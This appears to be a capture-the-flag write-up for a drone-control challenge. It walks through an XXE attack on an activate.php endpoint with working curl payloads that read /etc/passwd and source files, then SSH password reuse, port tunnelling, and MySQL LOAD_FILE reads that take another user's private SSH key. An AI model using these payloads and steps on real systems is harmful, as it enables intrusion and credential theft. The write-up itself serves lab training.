## Aerial

There are some endpoints that communicate using JSON payloads.

It turns out that the `activate.php` endpoint can also be called with a xml payload and is vulnerable to XXE attacks.
We can then perform these two curls to retrieve the content of the `/etc/passwd` and `readings.php` files.

```shell
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ELEMENT root ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><code>&xxe;</code></root>' http://[IP]:9085/activate.php
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ELEMENT root ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=readings.php" >]><root><code>&xxe;</code></root>' http://[IP]:9085/activate.php
```

By doing so we found the password used by the `kestrel` user to access the `data_subsystem` module which is a mysql instance.
We can use these credentials to login via ssh because of password reuse.

```shell
ssh kestrel@[IP] -p 2235
```

It works. Let's tunnel to access the database.

```shell
ssh kestrel@[IP] -p 2235 -L 3306:data_subsystem:3306
```

Now the `3306` port is mirrored to our local `3306` port, and now we can easily use any db client to access the database directly using that local port.

The MySQL server is vulnerable to local file read from the `kestrel` user:

```sql
SHOW GRANTS FOR 'kestrel'@'%';
SELECT LOAD_FILE('/etc/passwd')
```

Alright, the `factory` user exists. Let's read his `id_rsa` file.

```sql
SELECT LOAD_FILE('/home/factory/.ssh/id_rsa')
```
From the first container we can login via ssh with these commands:

```shell
chmod 600 factory_id_rsa
ssh factory@data_subsystem -i factory_id_rsa
```

where `factory_id_rsa` is the `id_rsa` file we just exfiltrated.

Oh, look! A `factory_reset.sh` file is present within his home folder.
It has his MySQL credentials to the `settings` database!
We can now decide to access the database and see the value of the `activation_code` setting, or we can just run the script again to set it to the default value we can see from the script.

Let's use the activation code to activate the drone.

Sweet, now we can access the controls! The flag will appear in the controls page.